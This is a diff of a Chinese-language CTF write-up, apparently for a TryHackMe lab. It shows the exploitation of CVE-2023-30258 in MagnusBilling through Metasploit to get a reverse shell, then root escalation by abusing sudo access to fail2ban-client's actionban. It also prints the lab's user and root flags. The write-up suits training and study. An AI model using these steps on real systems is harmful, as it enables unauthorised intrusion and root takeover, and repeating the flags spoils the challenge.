@@ -35,7 +35,7 @@ Bashgobuster dir -u http://10.144.148.138/mbilling -w /usr/share/seclists/Discov
 使用 searchsploit 搜索发现 CVE-2023-30258（MagnusBilling unauthenticated Command Injection）
 
 
-2. 初始访问 (Initial Foothold)
+## 2. 初始访问 (Initial Foothold)
 漏洞类型：Command Injection（RCE）
 CVE：CVE-2023-30258
 利用方式
@@ -47,7 +47,7 @@ set LHOST <你的Kali IP>
 exploit
 成功获得 www-data 权限的 reverse shell。
 
-3. 权限提升 (Privilege Escalation)
+## 3. 权限提升 (Privilege Escalation)
 枚举 sudo 权限
 Bashsudo -l
 关键发现：
@@ -55,7 +55,7 @@ text(ALL) NOPASSWD: /usr/bin/fail2ban-client
 提权利用（Fail2Ban Sudo 提权）
 Fail2Ban 以 root 权限运行，我们通过 fail2ban-client 修改 actionban 来让 root 执行任意命令。
 完整提权命令：
-Bash# 1. 添加自定义 action
+# 1. 添加自定义 action
 sudo /usr/bin/fail2ban-client set sshd addaction evil
 
 # 2. 修改 actionban 为我们想要执行的命令
@@ -68,13 +68,13 @@ sudo /usr/bin/fail2ban-client set sshd banip 1.2.3.5
 /bin/bash -p
 最终权限：root
 
-4. Flag
+## 4. Flag
 
 User Flag：THM{4a6831d5f124b25eefb1e92e0f0da4ca}
 Root Flag：THM{33ad5b530e71a172648f424ec23fae60}
 
 
-5. 学到的知识 / 新技巧
+## 5. 学到的知识 / 新技巧
 
 遇到登录界面不一定需要爆破
 有可能存在未授权 RCE（CVE），直接利用即可拿 shell。
